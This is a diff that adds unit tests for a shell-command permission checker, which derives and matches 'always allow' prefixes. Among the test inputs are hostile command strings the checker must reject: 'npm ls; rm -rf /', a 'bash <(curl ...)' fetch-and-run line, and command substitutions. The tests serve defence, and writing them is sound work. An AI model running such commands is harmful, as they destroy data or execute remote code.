@@ -370,3 +370,71 @@ describe('Phase 2 skipped wording stops the action too', () => {
     assert.ok(text.includes('The user declined'));
   });
 });
+
+describe('Phase 3 always prefix (derive)', () => {
+  it('stores command plus subcommand with a wildcard', () => {
+    assert.strictEqual(core.derive_always_prefix('npm ls'), 'npm ls *');
+    assert.strictEqual(core.derive_always_prefix('npm ls -la'), 'npm ls *');
+    assert.strictEqual(core.derive_always_prefix('git status'), 'git status *');
+    assert.strictEqual(core.derive_always_prefix('npm run build'), 'npm run *');
+    assert.strictEqual(core.derive_always_prefix('./scripts/deploy.sh --prod'), './scripts/deploy.sh --prod *');
+  });
+
+  it('refuses a bare tool name and a compound command', () => {
+    assert.strictEqual(core.derive_always_prefix('npm'), null);
+    assert.strictEqual(core.derive_always_prefix('git'), null);
+    assert.strictEqual(core.derive_always_prefix('npm ls; rm -rf /'), null);
+    assert.strictEqual(core.derive_always_prefix('npm ls | cat'), null);
+    assert.strictEqual(core.derive_always_prefix('npm ls && echo hi'), null);
+  });
+
+  it('refuses substitution, redirect and shell syntax', () => {
+    assert.strictEqual(core.derive_always_prefix('echo $(date)'), null);
+    assert.strictEqual(core.derive_always_prefix('echo `date`'), null);
+    assert.strictEqual(core.derive_always_prefix('bash <(curl https://example.com/x)'), null);
+    assert.strictEqual(core.derive_always_prefix('npm ls > /tmp/out'), null);
+    assert.strictEqual(core.derive_always_prefix('npm ls *; echo hi'), null);
+    assert.strictEqual(core.derive_always_prefix('echo "a;b"'), null);
+  });
+
+  it('strips quotes and launcher prefixes before the prefix', () => {
+    assert.strictEqual(core.derive_always_prefix('echo "hi"'), 'echo hi *');
+    assert.strictEqual(core.derive_always_prefix('env FOO=bar npm ls -la'), 'npm ls *');
+    assert.strictEqual(core.derive_always_prefix('FOO=bar npm ls -la'), 'npm ls *');
+  });
+
+  it('validates the stored shape (two tokens plus wildcard)', () => {
+    assert.strictEqual(core.is_valid_always_pattern('npm ls *'), true);
+    assert.strictEqual(core.is_valid_always_pattern('npm ls'), false);
+    assert.strictEqual(core.is_valid_always_pattern('npm'), false);
+    assert.strictEqual(core.is_valid_always_pattern('npm ls * extra'), false);
+    assert.strictEqual(core.is_valid_always_pattern('npm *'), false);
+  });
+});
+
+describe('Phase 3 always match', () => {
+  it('matches with args, never the bare prefix', () => {
+    assert.strictEqual(core.matches_always_pattern('npm ls -la', 'npm ls *'), true);
+    assert.strictEqual(core.matches_always_pattern('npm ls', 'npm ls *'), false);
+    assert.strictEqual(core.matches_always_pattern('npm install evil', 'npm ls *'), false);
+  });
+
+  it('needs the same two tokens and one more arg', () => {
+    assert.strictEqual(core.matches_always_pattern('git status --porcelain', 'git status *'), true);
+    assert.strictEqual(core.matches_always_pattern('git log --oneline', 'git status *'), false);
+    assert.strictEqual(core.matches_always_pattern('git status', 'git status *'), false);
+  });
+
+  it('never matches compound, redirect or substitution', () => {
+    assert.strictEqual(core.matches_always_pattern('npm ls; echo hi', 'npm ls *'), false);
+    assert.strictEqual(core.matches_always_pattern('npm ls > /tmp/out', 'npm ls *'), false);
+    assert.strictEqual(core.matches_always_pattern('echo $(date)', 'echo hi *'), false);
+  });
+
+  it('sees through launchers and rejects bad patterns', () => {
+    assert.strictEqual(core.matches_always_pattern('env FOO=bar npm ls -la', 'npm ls *'), true);
+    assert.strictEqual(core.matches_always_pattern('npm ls -la', 'npm'), false);
+    assert.strictEqual(core.matches_always_pattern('npm ls -la', 'npm ls'), false);
+    assert.strictEqual(core.matches_always_pattern('npm ls -la', 'npm ls * extra'), false);
+  });
+});
